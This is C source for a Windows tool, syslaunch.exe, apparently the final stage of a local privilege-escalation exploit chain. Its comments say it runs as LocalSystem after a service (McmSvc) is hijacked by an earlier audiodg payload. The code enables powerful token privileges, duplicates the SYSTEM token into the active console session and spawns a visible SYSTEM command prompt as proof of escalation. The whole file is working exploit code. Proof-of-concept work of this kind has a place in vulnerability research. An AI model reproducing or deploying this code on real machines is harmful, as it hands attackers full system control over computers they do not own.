// syslaunch.exe -- runs as LocalSystem (session 0) when McmSvc is reconfigured to it by the
// audiodg LocalService payload. Spawns a VISIBLE SYSTEM cmd.exe in the interactive console
// session so the operator can see a real SYSTEM child process (proof clip).
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wtsapi32.h>
#include <stdio.h>
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "advapi32.lib")

static void slog(const char* fmt, ...) {
    char b[1024]; va_list ap; va_start(ap, fmt);
    _vsnprintf_s(b, sizeof(b), _TRUNCATE, fmt, ap); va_end(ap);
    HANDLE h = CreateFileW(L"C:\\Users\\Public\\syslaunch.log", FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(h, b, (DWORD)strlen(b), &w, NULL); WriteFile(h, "\r\n", 2, &w, NULL); CloseHandle(h); }
}

static void enablePriv(HANDLE tok, const wchar_t* name) {
    TOKEN_PRIVILEGES tp = {0}; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid))
        AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
}

static DWORD pickSession(void) {
    DWORD s = WTSGetActiveConsoleSessionId();
    if (s != 0xFFFFFFFF && s != 0) return s;
    PWTS_SESSION_INFOW si = NULL; DWORD cnt = 0, found = 0xFFFFFFFF;
    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &si, &cnt)) {
        for (DWORD i = 0; i < cnt; i++) if (si[i].State == WTSActive) { found = si[i].SessionId; break; }
        WTSFreeMemory(si);
    }
    return (found != 0xFFFFFFFF) ? found : s;
}

int main(void) {
    char who[256]; DWORD wl = 256; GetUserNameA(who, &wl);
    slog("[syslaunch] running as %s pid=%lu", who, GetCurrentProcessId());

    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_PRIVILEGES, &hTok)) {
        slog("[syslaunch] OpenProcessToken err %lu", GetLastError()); return 1;
    }
    enablePriv(hTok, SE_TCB_NAME);
    enablePriv(hTok, SE_ASSIGNPRIMARYTOKEN_NAME);
    enablePriv(hTok, SE_INCREASE_QUOTA_NAME);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup)) {
        slog("[syslaunch] DuplicateTokenEx err %lu", GetLastError()); return 2;
    }
    DWORD sess = pickSession();
    slog("[syslaunch] target interactive session = %lu", sess);
    if (!SetTokenInformation(hDup, TokenSessionId, &sess, sizeof(sess)))
        slog("[syslaunch] SetTokenInformation(session) err %lu", GetLastError());

    STARTUPINFOW si = {0}; si.cb = sizeof(si); si.lpDesktop = L"WinSta0\\Default";
    PROCESS_INFORMATION pi = {0};
    // /k keeps the window open; whoami proves the identity on screen.
    wchar_t cmd[] = L"cmd.exe /k whoami";

    BOOL ok = CreateProcessAsUserW(hDup, L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, FALSE,
                                   CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
    if (!ok) {
        slog("[syslaunch] CreateProcessAsUser err %lu -> trying CreateProcessWithTokenW", GetLastError());
        ok = CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", cmd,
                                     CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        slog("[syslaunch] CreateProcessWithTokenW ok=%d err=%lu", ok, GetLastError());
    }
    if (ok) { slog("[syslaunch] *** spawned SYSTEM cmd pid=%lu in session %lu ***", pi.dwProcessId, sess);
              CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok ? 0 : 3;
}

